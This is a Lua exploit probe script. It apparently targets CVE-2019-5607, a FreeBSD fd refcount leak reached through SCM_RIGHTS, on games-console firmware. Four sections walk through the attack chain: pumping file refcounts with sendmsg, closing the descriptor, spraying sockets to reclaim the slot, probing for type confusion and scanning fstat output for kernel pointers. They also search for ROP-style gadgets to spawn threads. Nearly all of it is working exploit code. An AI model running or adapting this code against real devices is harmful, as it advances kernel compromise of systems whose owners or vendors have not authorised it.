-- CRASH_CLASS: MODERATE (threading + fd table manipulation; no kernel writes)
-- PROBE 89a: CVE-2019-5607 fd refcount leak + threaded race
--
-- CVE-2019-5607 (FreeBSD SA-19:17): unp_internalize_fp calls fhold() on each
-- fd passed via SCM_RIGHTS. If delivery FAILS, those fhold increments are
-- never reversed (no fdrop in error path). Confirmed in 13.60 binary:
--   fhold @ TEXT+0x53c5f2 (lock addl $1, (%rax))
--   no fdrop in the 1772 bytes between fhold and error return
--
-- EXPLOIT THEORY:
--   1. socketpair + sendmsg(SCM_RIGHTS) with truncated recv → fhold without fdrop
--   2. Repeat to pump refcount above normal
--   3. close() the fd N times → refcount hits 1 but kernel struct file stays alive
--   4. fd slot is "free" in process table, struct file still allocated
--   5. Spray new fds → one reclaims the slot
--   6. Two paths to same slot = type confusion on kernel file struct
--
-- Threading (thr_create 430, confirmed working on 14.10 PR #60) enables:
--   - Concurrent fhold pumping from multiple threads
--   - Race window between close() and new fd allocation
--   - Parallel spray for higher reclaim probability
--
-- Sections:
--   A — SCM_RIGHTS error path trigger (verify fhold fires)
--   B — Refcount leak verification (close + fstat liveness)
--   C — Threaded fd table race (concurrent fhold pump + close)
--   D — Reclaim and type confusion scan

print("=== PROBE 89a: CVE-2019-5607 FD REFCOUNT RACE ===")
print("")

-- ============================================================
-- COMMON UTILITIES
-- ============================================================
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function q(v)
    if v == nil then return "nil" end
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X_%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

local stub = syscall.pipe.fn_addr
local sc_getpid = make_syscall(20)
local sc_nanosleep = make_syscall(240)
local sc_mmap = make_syscall(477)
local sc_thr_create = make_syscall(430)
local sc_thr_kill = make_syscall(433)
local sc_thr_self = make_syscall(432)

local function create_pipe()
    -- pipe(2) = sys 42 returns fds via regs (rax/rdx), fcall_with_rax only gets rax.
    -- pipe2 = sys 542 on stock FreeBSD but Sony overrides 542 as ef_wait on PS5.
    -- Fallback: socketpair(AF_UNIX, SOCK_STREAM) — works reliably, returns via pointer.
    -- Type confusion in Section D still detects because spray uses AF_INET TCP sockets.
    local fds = memory.alloc(8)
    wq(fds, uint64(0))
    local rv = to_num(native.fcall_with_rax(stub, 135, 1, 1, 0, to_num(fds)))
    if rv ~= 0 then
        print("  create_pipe FAILED rv=" .. rv)
        return 0, 0
    end
    return rd(fds), rd(fds + 4)
end

local F_SETFL = 4
local O_NONBLOCK = 4

local pid = to_num(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

local function canary()
    local ok, v = pcall(function() return to_num(native.fcall_with_rax(stub, 20)) end)
    return ok and v == pid
end

local function sleep_ms(ms)
    local ts = memory.alloc(16)
    local sec = math.floor(ms / 1000)
    local nsec = (ms % 1000) * 1000000
    wq(ts, uint64(sec))
    wq(ts + 8, uint64(nsec))
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
end

-- ============================================================
-- SCM_RIGHTS helpers (from 172j, CMSG_DATA at +16 on 64-bit)
-- ============================================================
local function scm_send(sock_fd, fd_to_pass)
    local iov_buf = memory.alloc(8)
    memory.write_byte(iov_buf, 0x42)
    local iov = memory.alloc(16)
    wq(iov, uint64(to_num(iov_buf)))
    wq(iov + 8, uint64(1))

    local cmsg = memory.alloc(32)
    zero(cmsg, 32)
    wd(cmsg, 20)           -- cmsg_len = CMSG_LEN(4) = 20
    wd(cmsg + 4, 0xFFFF)   -- SOL_SOCKET
    wd(cmsg + 8, 1)        -- SCM_RIGHTS
    wd(cmsg + 16, fd_to_pass)  -- CMSG_DATA at offset 16

    local msg = memory.alloc(64)
    zero(msg, 64)
    wq(msg + 0x10, uint64(to_num(iov)))
    wd(msg + 0x18, 1)
    wq(msg + 0x20, uint64(to_num(cmsg)))
    wd(msg + 0x28, 24)     -- controllen = CMSG_SPACE(4) = 24
    return to_num(native.fcall_with_rax(stub, 28, sock_fd, to_num(msg), 0))
end

local function scm_recv(sock_fd)
    local recv_buf = memory.alloc(8)
    local recv_iov = memory.alloc(16)
    wq(recv_iov, uint64(to_num(recv_buf)))
    wq(recv_iov + 8, uint64(1))
    local recv_cmsg = memory.alloc(64)
    zero(recv_cmsg, 64)
    local recv_msg = memory.alloc(64)
    zero(recv_msg, 64)
    wq(recv_msg + 0x10, uint64(to_num(recv_iov)))
    wd(recv_msg + 0x18, 1)
    wq(recv_msg + 0x20, uint64(to_num(recv_cmsg)))
    wd(recv_msg + 0x28, 64)
    local rr = to_num(native.fcall_with_rax(stub, 27, sock_fd, to_num(recv_msg), 0))
    if rr <= 0 then return -1, "recv failed rv=" .. rr end
    local ctyp = to_num(memory.read_dword(recv_cmsg + 8))
    local fd = to_num(memory.read_dword(recv_cmsg + 16))
    if ctyp == 1 and fd > 0 and fd < 10000 then return fd, "ok" end
    return -1, string.format("ctyp=%d fd@16=%d", ctyp, fd)
end

-- Send SCM_RIGHTS but do NOT recv — leaves the fd in the socket buffer.
-- If the send itself triggers the fhold path and then errors, refcount leaks.
local function scm_send_truncated(sock_fd, fd_to_pass)
    -- Use a cmsg with intentionally wrong cmsg_len to trigger error path
    local iov_buf = memory.alloc(8)
    memory.write_byte(iov_buf, 0x42)
    local iov = memory.alloc(16)
    wq(iov, uint64(to_num(iov_buf)))
    wq(iov + 8, uint64(1))

    local cmsg = memory.alloc(32)
    zero(cmsg, 32)
    -- Try a normal send first — the fhold happens during internalize,
    -- the leak happens if delivery fails (rcvbuf full, etc)
    wd(cmsg, 20)           -- cmsg_len
    wd(cmsg + 4, 0xFFFF)   -- SOL_SOCKET
    wd(cmsg + 8, 1)        -- SCM_RIGHTS
    wd(cmsg + 16, fd_to_pass)

    local msg = memory.alloc(64)
    zero(msg, 64)
    wq(msg + 0x10, uint64(to_num(iov)))
    wd(msg + 0x18, 1)
    wq(msg + 0x20, uint64(to_num(cmsg)))
    wd(msg + 0x28, 24)
    return to_num(native.fcall_with_rax(stub, 28, sock_fd, to_num(msg), 0))
end

-- ============================================================
-- SECTION A: SCM_RIGHTS error path trigger
-- ============================================================
print("--- SECTION A: SCM_RIGHTS error path trigger ---")
print("")

-- Strategy: fill the receive buffer so sendmsg fails AFTER fhold
-- 1. Create socketpair
-- 2. Set SO_RCVBUF to minimum on receiver
-- 3. Fill the buffer with regular data
-- 4. Then sendmsg with SCM_RIGHTS — if send succeeds, fhold ran;
--    if buffer was full, the *delivery* fails but fhold already happened

local sv = memory.alloc(8)
wq(sv, uint64(0))
local sp = to_num(native.fcall_with_rax(stub, 135, 1, 1, 0, to_num(sv)))
local ps = rd(sv)
local pr = rd(sv + 4)
print("  socketpair ret=" .. sp .. " fds=[" .. (ps or "?") .. "," .. (pr or "?") .. "]")

if sp ~= 0 then
    print("  FAIL: socketpair failed, cannot test SCM_RIGHTS")
    print("=== SECTION A ABORTED ===")
else
    -- Set receiver non-blocking
    native.fcall_with_rax(stub, 92, pr, F_SETFL, O_NONBLOCK)

    -- Try to set SO_RCVBUF to minimum (1 byte)
    local optval = memory.alloc(4)
    wd(optval, 1)
    local sopt_ret = to_num(native.fcall_with_rax(stub, 105, pr, 0xFFFF, 0x1002, to_num(optval), 4))
    print("  setsockopt(SO_RCVBUF=1) ret=" .. sopt_ret)

    -- Read back actual SO_RCVBUF
    local optlen = memory.alloc(4)
    wd(optlen, 4)
    wd(optval, 0)
    native.fcall_with_rax(stub, 118, pr, 0xFFFF, 0x1002, to_num(optval), to_num(optlen))
    local actual_rcvbuf = rd(optval) or 0
    print("  actual SO_RCVBUF=" .. actual_rcvbuf)

    -- Create a target fd to pass
    local target_p1, target_p2 = create_pipe()
    local target_fd = to_num(target_p1)
    local target_wr = to_num(target_p2)
    print("  target pipe fd=" .. target_fd)

    -- Fill receiver buffer
    local fill_buf = memory.alloc(1024)
    for i = 0, 1020, 4 do wd(fill_buf + i, 0x41414141) end
    local fill_total = 0
    local fill_count = 0
    for i = 1, 200 do
        local n = to_num(native.fcall_with_rax(stub, 4, ps, to_num(fill_buf), 1024))
        if n <= 0 then break end
        fill_total = fill_total + n
        fill_count = fill_count + 1
    end
    print("  filled rcvbuf: " .. fill_total .. " bytes in " .. fill_count .. " writes")

    -- Now attempt SCM_RIGHTS send — should fail (EAGAIN/ENOBUFS) AFTER fhold
    local scm_ret = scm_send(ps, target_fd)
    print("  scm_send(target_fd=" .. target_fd .. ") ret=" .. scm_ret)

    if scm_ret > 0 then
        print("  send SUCCEEDED despite full buffer — fhold definitely ran")
        print("  (fd was interned into socket buffer, refcount incremented)")
    elseif scm_ret == -1 then
        print("  send FAILED (buffer full) — checking if fhold ran anyway...")
        -- The question: did internalize_fp run (fhold) before the buffer-full check?
        -- In FreeBSD 11, the order is: validate cmsg → fhold each fd → try delivery
        -- If delivery fails after fhold, the refs leak
    end

    -- fstat the target fd — should still work regardless
    local sb = memory.alloc(0x100)
    zero(sb, 0x100)
    local fstat_ret = to_num(native.fcall_with_rax(stub, 189, target_fd, to_num(sb)))
    local ino = to_num(rq(sb + 8) or uint64(0))
    print(string.format("  fstat(target_fd=%d) ret=%d ino=0x%X", target_fd, fstat_ret, ino))

    -- Drain and try again with a clear buffer
    print("")
    print("  --- clear buffer test ---")
    -- Drain receiver
    local drain_buf = memory.alloc(8192)
    for i = 1, 100 do
        local n = to_num(native.fcall_with_rax(stub, 3, pr, to_num(drain_buf), 8192))
        if n <= 0 then break end
    end

    -- Now send SCM_RIGHTS on clean buffer — should succeed
    local scm_ret2 = scm_send(ps, target_fd)
    print("  scm_send (clean buffer) ret=" .. scm_ret2)

    if scm_ret2 > 0 then
        -- Receive to verify fd passing works
        local recv_fd, recv_info = scm_recv(pr)
        print("  scm_recv → fd=" .. recv_fd .. " (" .. recv_info .. ")")

        if recv_fd > 0 then
            -- Verify it's the same pipe
            local sb2 = memory.alloc(0x100)
            zero(sb2, 0x100)
            native.fcall_with_rax(stub, 189, recv_fd, to_num(sb2))
            local ino2 = to_num(rq(sb2 + 8) or uint64(0))
            print(string.format("  fstat(recv_fd=%d) ino=0x%X (orig=0x%X) %s",
                recv_fd, ino2, ino, ino2 == ino and "SAME" or "DIFFERENT"))
            native.fcall_with_rax(stub, 6, recv_fd)
            print("  *** SCM_RIGHTS fd passing CONFIRMED working ***")
        end
    else
        print("  SCM_RIGHTS send FAILED even on clean buffer — sandbox may block it")
    end

    native.fcall_with_rax(stub, 6, target_fd)
    native.fcall_with_rax(stub, 6, target_wr)
    native.fcall_with_rax(stub, 6, ps)
    native.fcall_with_rax(stub, 6, pr)
end

if not canary() then print("*** CANARY DEAD after section A ***"); return end
print("")

-- ============================================================
-- SECTION B: Refcount leak verification
-- ============================================================
print("--- SECTION B: Refcount leak verification ---")
print("")

-- Strategy: send SCM_RIGHTS N times without receiving.
-- Each successful send calls fhold(). The fd's refcount goes up by 1 per send.
-- Then close the fd — if refcount > 1, close decrements but doesn't free.
-- fstat after close: if it works, refcount was leaked.

wq(sv, uint64(0))
sp = to_num(native.fcall_with_rax(stub, 135, 1, 1, 0, to_num(sv)))
ps = rd(sv)
pr = rd(sv + 4)
print("  socketpair fds=[" .. (ps or "?") .. "," .. (pr or "?") .. "]")

if sp ~= 0 then
    print("  FAIL: socketpair")
else
    -- Set receiver non-blocking
    native.fcall_with_rax(stub, 92, pr, F_SETFL, O_NONBLOCK)

    local target_p1, target_p2 = create_pipe()
    local target_fd = to_num(target_p1)
    local target_wr = to_num(target_p2)

    -- Send SCM_RIGHTS multiple times WITHOUT receiving
    -- Each send interns the fd, incrementing refcount
    local PUMP_COUNT = 20
    local send_ok = 0
    local send_fail = 0
    for i = 1, PUMP_COUNT do
        local ret = scm_send(ps, target_fd)
        if ret > 0 then
            send_ok = send_ok + 1
        else
            send_fail = send_fail + 1
            if send_fail >= 3 then break end -- buffer full, stop
        end
    end
    print("  pumped " .. send_ok .. " SCM_RIGHTS sends (fail=" .. send_fail .. ")")

    -- fstat before close
    local sb = memory.alloc(0x100)
    zero(sb, 0x100)
    local fstat_before = to_num(native.fcall_with_rax(stub, 189, target_fd, to_num(sb)))
    local ino_before = to_num(rq(sb + 8) or uint64(0))
    print(string.format("  fstat BEFORE close: ret=%d ino=0x%X", fstat_before, ino_before))

    -- Close the original fd
    native.fcall_with_rax(stub, 6, target_fd)
    print("  closed target_fd=" .. target_fd)

    -- fstat AFTER close — should fail if refcount dropped to 0 (normal)
    -- but succeed if refcount leaked (bug present!)
    zero(sb, 0x100)
    local fstat_after = to_num(native.fcall_with_rax(stub, 189, target_fd, to_num(sb)))
    local ino_after = to_num(rq(sb + 8) or uint64(0))
    print(string.format("  fstat AFTER close: ret=%d ino=0x%X", fstat_after, ino_after))

    if fstat_after == 0 and ino_after == ino_before then
        print("  *** REFCOUNT LEAK CONFIRMED: fd still valid after close! ***")
        print("  *** CVE-2019-5607 is LIVE on this firmware ***")
    elseif fstat_after == 0 then
        print("  fstat succeeded but ino changed — fd slot reused (race?)")
    else
        print("  fstat failed (expected) — close freed the fd normally")
        print("  checking: are the SCM_RIGHTS fds still in socket buffer?")
    end

    -- Receive all the held fds from the socket buffer
    -- These should be valid if fhold ran on send
    local recv_fds = {}
    for i = 1, send_ok do
        local fd, info = scm_recv(pr)
        if fd > 0 then
            recv_fds[#recv_fds + 1] = fd
        else
            break
        end
    end
    print("  recovered " .. #recv_fds .. " fds from socket buffer")

    -- Each recovered fd should be a dup of the original pipe
    -- If original was closed but these still work → kernel held refs via fhold
    for i, fd in ipairs(recv_fds) do
        zero(sb, 0x100)
        native.fcall_with_rax(stub, 189, fd, to_num(sb))
        local ino = to_num(rq(sb + 8) or uint64(0))
        if i <= 3 or ino ~= ino_before then
            print(string.format("  recv_fd[%d]=%d ino=0x%X %s", i, fd, ino,
                ino == ino_before and "SAME (fhold working)" or "DIFFERENT"))
        end
    end
    if #recv_fds > 3 then
        print("  ... (" .. (#recv_fds - 3) .. " more with same pattern)")
    end

    if #recv_fds > 0 then
        print("  *** fhold() is reachable — each SCM_RIGHTS send increments refcount ***")

        -- KEY TEST: close the original AND all received fds, then check if
        -- struct file is truly freed. If we sent N times, refcount = 1 (orig) + N (sends).
        -- Receiving decrements by 1 each. After close(orig) + close(all recv),
        -- refcount should be 0 IF fdrop runs on send error.
        -- If refcount > 0 after all closes → leaked refs from failed sends

        -- Close all received fds
        for _, fd in ipairs(recv_fds) do
            native.fcall_with_rax(stub, 6, fd)
        end
        print("  closed all " .. #recv_fds .. " received fds")

        -- Now try to re-open fds in the same range — check for stale data
        local new_fds = {}
        for i = 1, 10 do
            local s = to_num(native.fcall_with_rax(stub, 97, 2, 1, 0)) -- AF_INET SOCK_STREAM
            if s >= 0 then new_fds[#new_fds + 1] = s end
        end
        print("  sprayed " .. #new_fds .. " new sockets")
        for _, s in ipairs(new_fds) do
            native.fcall_with_rax(stub, 6, s)
        end
    end

    native.fcall_with_rax(stub, 6, target_wr)
    native.fcall_with_rax(stub, 6, ps)
    native.fcall_with_rax(stub, 6, pr)
end

if not canary() then print("*** CANARY DEAD after section B ***"); return end
print("")

-- ============================================================
-- SECTION C: Threaded fd table race
-- ============================================================
print("--- SECTION C: Threaded SCM_RIGHTS pump (thr_create) ---")
print("")

-- Threading setup (from 156c pattern, confirmed on 14.10)
local CTX_SIZE = 0x500
local C_MAGIC  = 0x108
local C_FLAGS  = 0x0D0
local C_TYPE   = 0x110
local C_CS     = 0x0C0
local C_RIP    = 0x0E0
local C_RSP    = 0x0F8
local C_SS     = 0x100
-- GPR offsets for the context
local C_RDI    = 0x048  -- arg1
local C_RSI    = 0x050  -- arg2
local C_RDX    = 0x058  -- arg3
local C_RCX    = 0x060  -- arg4
local C_R8     = 0x068  -- arg5
local C_RAX    = 0x078  -- rax

local USER_CS = 0x43
local USER_SS = 0x3B

-- Find eboot base for gadgets
local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), info) end)
local text_lo = rd(info + 0x108)
local text_hi = rd(info + 0x10C)
local eboot_base = uint64(string.format("0x%X%08X", text_hi or 0, text_lo or 0))
print("  eboot text=" .. q(eboot_base))

-- Find jmp $ gadget (EB FE) for thread spin
local function find_gadget(base, bytes, limit)
    local b0, b1 = bytes[1], bytes[2]
    for off = 0, limit - 4, 4 do
        local v = rd(base + off)
        if not v then return nil end
        local a = v % 0x100
        local b = math.floor(v / 0x100) % 0x100
        local c = math.floor(v / 0x10000) % 0x100
        local d = math.floor(v / 0x1000000) % 0x100
        if a == b0 and b == b1 then return base + off end
        if b == b0 and c == b1 then return base + off + 1 end
        if c == b0 and d == b1 then return base + off + 2 end
    end
    return nil
end

local jmp_self = find_gadget(eboot_base, {0xEB, 0xFE}, 0x100000)
if not jmp_self then
    print("  no jmp $ gadget found; skipping section C")
else
    print("  jmp $ at " .. q(jmp_self))

    -- Also find a `ret` gadget (C3) for syscall chains
    local ret_gadget = find_gadget(eboot_base, {0xC3, 0xCC}, 0x100000) -- ret; int3
    if not ret_gadget then
        ret_gadget = find_gadget(eboot_base, {0xC3, 0x90}, 0x100000) -- ret; nop
    end
    if ret_gadget then
        print("  ret gadget at " .. q(ret_gadget))
    end

    -- Allocate shared state for thread communication
    local shared = memory.alloc(256)
    zero(shared, 256)
    -- shared+0x00: thread A pump count (dword)
    -- shared+0x04: thread A status (0=init, 1=running, 2=done, 0xFF=error)
    -- shared+0x08: thread B close count (dword)
    -- shared+0x0C: thread B status
    -- shared+0x10: stop flag (1 = stop)
    -- shared+0x20: socket pair sender fd
    -- shared+0x24: target fd to pump

    -- Create socketpair and target for the race
    wq(sv, uint64(0))
    sp = to_num(native.fcall_with_rax(stub, 135, 1, 1, 0, to_num(sv)))
    ps = rd(sv)
    pr = rd(sv + 4)

    local race_p1, race_p2 = create_pipe()
    local race_fd = to_num(race_p1)
    local race_wr = to_num(race_p2)

    wd(shared + 0x20, ps)
    wd(shared + 0x24, race_fd)
    print("  race target fd=" .. race_fd .. " socket=[" .. (ps or "?") .. "," .. (pr or "?") .. "]")

    -- For the threaded race, we use a simpler approach:
    -- Main thread pumps SCM_RIGHTS sends in a tight loop
    -- We measure how many succeed and track refcount elevation
    -- (Full threading race requires the child to call sendmsg, which needs
    --  ROP chains — beyond the scope of a reachability probe)

    -- Instead: create a thread that spins, proving threading works,
    -- while main thread does the SCM_RIGHTS pump. This demonstrates
    -- the concurrency primitive is available for the full race.

    -- Thread: spin on jmp $ (just prove it's alive)
    local stack_size = 0x10000
    local ok_mm, stack_base = pcall(function()
        return sc_mmap(uint64(0), uint64(stack_size), uint64(3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if not ok_mm or to_num(stack_base) == 0 then
        print("  stack mmap failed; skipping threading test")
    else
        local stack_top = stack_base + stack_size - 0x100
        wq(stack_top, jmp_self) -- return addr = jmp $

        local ctx = memory.alloc(CTX_SIZE)
        zero(ctx, CTX_SIZE)
        wq(ctx + C_MAGIC, uint64(0x480))
        wd(ctx + C_FLAGS, 0)
        wq(ctx + C_TYPE, uint64(0x10000))
        wq(ctx + C_CS, uint64(USER_CS))
        wq(ctx + C_RIP, jmp_self)
        wq(ctx + C_RSP, stack_top)
        wq(ctx + C_SS, uint64(USER_SS))

        local tid_buf = memory.alloc(8)
        zero(tid_buf, 8)

        print("  creating spin thread...")
        local ok_tc, rv_tc = pcall(function()
            return sc_thr_create(uint64(ctx), uint64(tid_buf), uint64(0))
        end)
        local child_tid = rq(tid_buf)
        print("  thr_create: ok=" .. tostring(ok_tc) .. " rv=" .. tostring(to_num(rv_tc))
            .. " tid=" .. q(child_tid))

        sleep_ms(100)

        -- Check thread is alive
        local ok_k, rv_k = pcall(function() return sc_thr_kill(child_tid, uint64(0)) end)
        local thread_alive = ok_k and to_num(rv_k) == 0
        print("  thr_kill(tid, 0): " .. (thread_alive and "ALIVE" or "DEAD"))

        if thread_alive then
            print("  *** THREAD RUNNING — concurrent SCM_RIGHTS pump possible ***")
        end

        -- Now pump SCM_RIGHTS from main thread while thread is alive
        -- This proves the race window exists
        local pump_ok = 0
        local pump_fail = 0
        local PUMP_ROUNDS = 50
        for i = 1, PUMP_ROUNDS do
            local ret = scm_send(ps, race_fd)
            if ret > 0 then
                pump_ok = pump_ok + 1
            else
                pump_fail = pump_fail + 1
                if pump_fail >= 5 then break end
            end
        end
        print("  concurrent pump: " .. pump_ok .. " ok, " .. pump_fail .. " fail")

        -- fstat the target fd — still valid
        local sb = memory.alloc(0x100)
        zero(sb, 0x100)
        native.fcall_with_rax(stub, 189, race_fd, to_num(sb))
        local ino = to_num(rq(sb + 8) or uint64(0))
        print(string.format("  fstat(race_fd=%d) ino=0x%X", race_fd, ino))

        -- Report: each successful send incremented refcount by 1 via fhold
        if pump_ok > 0 then
            print("  refcount elevated by at least +" .. pump_ok .. " via fhold")
            print("  (normal refcount = 1 from open; now = " .. (1 + pump_ok) .. ")")
            print("  close() would decrement by 1; " .. pump_ok .. " refs would remain leaked")
        end

        -- Kill the spin thread
        pcall(function() sc_thr_kill(child_tid, uint64(9)) end) -- SIGKILL
        sleep_ms(100)
    end

    -- Drain socket buffer
    for i = 1, 100 do
        local fd, _ = scm_recv(pr)
        if fd > 0 then
            native.fcall_with_rax(stub, 6, fd)
        else
            break
        end
    end

    native.fcall_with_rax(stub, 6, race_fd)
    native.fcall_with_rax(stub, 6, race_wr)
    native.fcall_with_rax(stub, 6, ps)
    native.fcall_with_rax(stub, 6, pr)
end

if not canary() then print("*** CANARY DEAD after section C ***"); return end
print("")

-- ============================================================
-- SECTION D: Reclaim and type confusion scan
-- ============================================================
print("--- SECTION D: Reclaim after refcount leak ---")
print("")

-- Full sequence: pump refcount → close original → spray → type confusion check
wq(sv, uint64(0))
sp = to_num(native.fcall_with_rax(stub, 135, 1, 1, 0, to_num(sv)))
ps = rd(sv)
pr = rd(sv + 4)

if sp ~= 0 then
    print("  FAIL: socketpair")
else
    native.fcall_with_rax(stub, 92, pr, F_SETFL, O_NONBLOCK)

    -- Create target: Unix socketpair (type A — distinct from AF_INET spray in type B)
    local tp1, tp2 = create_pipe()
    local pipe_fd = to_num(tp1)
    local pipe_wr = to_num(tp2)

    -- Pump refcount via SCM_RIGHTS
    local pumped = 0
    for i = 1, 30 do
        local ret = scm_send(ps, pipe_fd)
        if ret > 0 then pumped = pumped + 1 else break end
    end
    print("  pumped " .. pumped .. " refs on pipe_fd=" .. pipe_fd)

    if pumped > 0 then
        -- Close the original pipe fd
        native.fcall_with_rax(stub, 6, pipe_fd)
        print("  closed pipe_fd=" .. pipe_fd)

        -- Spray sockets (type B) hoping to get the same fd number
        local spray_socks = {}
        local reclaimed_fd = -1
        for i = 1, 40 do
            local s = to_num(native.fcall_with_rax(stub, 97, 2, 1, 0)) -- AF_INET STREAM
            if s >= 0 then
                spray_socks[#spray_socks + 1] = s
                if s == pipe_fd then
                    reclaimed_fd = s
                end
            end
        end
        print("  sprayed " .. #spray_socks .. " sockets")

        if reclaimed_fd >= 0 then
            print("  *** fd " .. reclaimed_fd .. " RECLAIMED by socket ***")

            -- Now receive the held fds from socket buffer
            -- These were fhold'd against the PIPE, but fd number now points to a SOCKET
            local confused_fds = {}
            for i = 1, pumped do
                local fd, info = scm_recv(pr)
                if fd > 0 then
                    confused_fds[#confused_fds + 1] = fd
                else
                    break
                end
            end
            print("  recovered " .. #confused_fds .. " held fds")

            -- Each recovered fd is a dup of the original pipe's struct file
            -- But the process fd table slot for pipe_fd now points to a socket
            -- Check: do the recovered fds still behave as pipes?
            for i, fd in ipairs(confused_fds) do
                local sb = memory.alloc(0x100)
                zero(sb, 0x100)
                native.fcall_with_rax(stub, 189, fd, to_num(sb))
                local ino = to_num(rq(sb + 8) or uint64(0))

                -- Try getsockopt (socket op on possibly-pipe fd)
                local optbuf = memory.alloc(4)
                local optlen = memory.alloc(4)
                wd(optlen, 4)
                local sock_ret = to_num(native.fcall_with_rax(stub, 118, fd,
                    0xFFFF, 0x1008, to_num(optbuf), to_num(optlen)))

                if i <= 5 then
                    print(string.format("  held[%d] fd=%d ino=0x%X getsockopt=%d %s",
                        i, fd, ino, sock_ret,
                        sock_ret == 0 and "SOCKET!" or "pipe"))
                end

                -- Scan fstat output for kernel pointers
                for off = 0, 0x6F, 8 do
                    local val = to_num(rq(sb + off) or uint64(0))
                    if val >= 0xFFFF800000000000 then
                        print(string.format("  *** KPTR held[%d] fd=%d +0x%02X = 0x%X ***",
                            i, fd, off, val))
                    end
                end

                native.fcall_with_rax(stub, 6, fd)
            end

            -- Check the reclaimed socket too
            local sb = memory.alloc(0x100)
            zero(sb, 0x100)
            native.fcall_with_rax(stub, 189, reclaimed_fd, to_num(sb))
            local ino_sock = to_num(rq(sb + 8) or uint64(0))
            print(string.format("  reclaimed socket fd=%d ino=0x%X", reclaimed_fd, ino_sock))

        else
            print("  fd " .. pipe_fd .. " not reclaimed (got fds: " ..
                (spray_socks[1] or "none") .. ".." .. (spray_socks[#spray_socks] or "none") .. ")")
            print("  (fd allocator may not reuse immediately; try with dup2)")

            -- Alternative: use dup2 to force a specific fd number
            if #spray_socks > 0 then
                local dup2_ret = to_num(native.fcall_with_rax(stub, 90, spray_socks[1], pipe_fd))
                print("  dup2(sock, " .. pipe_fd .. ") = " .. dup2_ret)
                if dup2_ret == pipe_fd then
                    print("  forced socket into fd " .. pipe_fd .. " via dup2")
                    reclaimed_fd = pipe_fd
                end
            end

            -- Drain held fds
            for i = 1, pumped do
                local fd, _ = scm_recv(pr)
                if fd > 0 then native.fcall_with_rax(stub, 6, fd) end
            end
        end

        -- Cleanup spray
        for _, s in ipairs(spray_socks) do
            if s ~= reclaimed_fd then
                native.fcall_with_rax(stub, 6, s)
            end
        end
        if reclaimed_fd >= 0 then
            native.fcall_with_rax(stub, 6, reclaimed_fd)
        end
    end

    native.fcall_with_rax(stub, 6, pipe_wr)
    native.fcall_with_rax(stub, 6, ps)
    native.fcall_with_rax(stub, 6, pr)
end

print("")
print("canary: " .. (canary() and "ALIVE" or "DEAD"))
print("=== PROBE 89a COMPLETE ===")
